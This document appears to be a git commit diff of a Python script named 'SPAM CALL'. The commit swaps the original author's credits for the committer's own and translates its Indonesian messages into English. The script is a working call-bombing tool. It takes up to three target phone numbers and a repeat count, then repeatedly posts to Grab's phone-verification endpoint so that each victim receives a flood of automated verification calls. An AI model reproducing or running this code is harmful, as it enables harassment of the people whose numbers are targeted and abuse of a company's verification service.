a0310f0a520df72afe7812749274f4987c1760c0
hizkanatic <50532439+hizkanatic@users.noreply.github.com>
2019-05-12 07:11:43 +0700

    Update sc.py

--- sc.py
+++ sc.py
@@ -1,15 +1,14 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# Coded by KANG-NEWBIE
+# Coded by hizkan4tic
 """
-ngapai bosq? mau recode?
-tinggal pake aja susah amat sih?!
+Hi >_<
 """
 
 try:
 	import os, requests, time
 except ModuleNotFoundError:
-	print("\nSepertinya module requests BELUM Di Install")
+	print("\nIt seems like the module requests have NOT been installed")
 	print("$ pip install requests\n")
 	exit()
 
@@ -19,23 +18,23 @@ r=('\033[1;31m')
 g=('\033[1;32m')
 w=('\033[1;37m')
 print("""%s
-			SPAM CALL MASSAL v.3.0%s
+			SPAM CALL V.1.0%s
  ,_     _‚
- |\\\___//|	%sAuthor: KANG-NEWBIE%s
- |=6   6=|	%sContact: https://t.me/kang_nuubi%s
- \=._Y_.=/	%sGithub: https://github.com/KANG-NEWBIE%s
-  )  `  (    ,	%sTEAM: CRABS (t.me/CRABS_ID)%s
+ |\\\___//|	%sAuthor: hizkan4tic%s
+ |=6   6=|	%sContact: https://instagram.com/hizqilhkm%s
+ \=._Y_.=/	%sGithub: https://github.com/hizkan4tic%s
+  )  `  (    ,	%sTEAM: NO TEAM%s
  /       \  ((
  |       |   ))
-/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
+/| |   | |\_//	%sENTER NUMBER WITH "62" (EX: 628XXXXXX)%s
 \| |._.| |/-’
  '"'   '"'
-<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silahkan hubungi saya"""%(c,r,g,r,g,r,g,r,g,r,w,r))
-print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
-no1 = input("[?] NUM TARGET 1 => %s"%(w))
-no2 = input("%s[?] NUM TARGET 2 => %s"%(g,w))
-no3 = input("%s[?] NUM TARGET 3 => %s"%(g,w))
-jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
+<NOTE> If there is an ERROR or BUG and others, please contact me"""%(c,r,g,r,g,r,g,r,g,r,w,r))
+print("%s[*] Click ENTER%s"%(g,g))
+no1 = input("[?] NO TARGET 1 => %s"%(w))
+no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
+no3 = input("%s[?] NO TARGET 3 => %s"%(g,w))
+jlmh=int(input("%s[?] Amount of Spam => %s"%(g,w)))
 dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
 dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
 dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
@@ -44,24 +43,24 @@ try:
 	print()
 	print("%s[-] RESULT:%s"%(r,w))
 	for i in range(jlmh):
-		print("[!] PLEASE WAIT...")
+		print("[!] WAIT DEAR...")
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
 		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
 		if str(idk) in str(r1.text):
-			print("[+] TARGET1 BERHASIL")
+			print("[+] TARGET1 SUCCES")
 		else:
-			print("[-] TARGET1 GAGAL")
+			print("[-] TARGET1 FAILED")
 		if str(idk) in str(r2.text):
-			print("[+] TARGET2 BERHASIL")
+			print("[+] TARGET2 SUCCES")
 		else:
-			print("[-] TARGET2 GAGAL")
+			print("[-] TARGET2 FAILED")
 		if str(idk) in str(r3.text):
-			print("[+] TARGET3 BERHASIL")
+			print("[+] TARGET3 SUCCES")
 		else:
-			print("[-] TARGET3 GAGAL")
+			print("[-] TARGET3 FAILED")
 		print("="*30)
 		time.sleep(1)
 except KeyboardInterrupt:
-	print("%ssampai jumpa gan..."%(c))
+	print("%see you again..."%(c))
